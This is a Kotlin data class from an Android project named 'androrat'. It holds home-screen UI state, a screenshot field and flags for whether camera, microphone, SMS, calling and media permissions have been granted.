package com.ierusalem.androrat.features.home.domain

import android.Manifest
import android.os.Build
import androidx.compose.runtime.Immutable
import androidx.compose.ui.graphics.ImageBitmap

@Immutable
data class HomeScreenState(
    val screenshot: ImageBitmap? = null,
    val permissions : MutableMap<String, Boolean> = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) mutableMapOf(
        Manifest.permission.RECORD_AUDIO to false,
        Manifest.permission.CALL_PHONE to false,
        Manifest.permission.READ_MEDIA_IMAGES to false,
        Manifest.permission.READ_MEDIA_AUDIO to false,
        Manifest.permission.CAMERA to false,
        Manifest.permission.READ_SMS to false,
    ) else mutableMapOf(
        Manifest.permission.RECORD_AUDIO to false,
        Manifest.permission.CALL_PHONE to false,
        Manifest.permission.READ_EXTERNAL_STORAGE to false,
        Manifest.permission.CAMERA to false,
        Manifest.permission.READ_SMS to false,
    )
)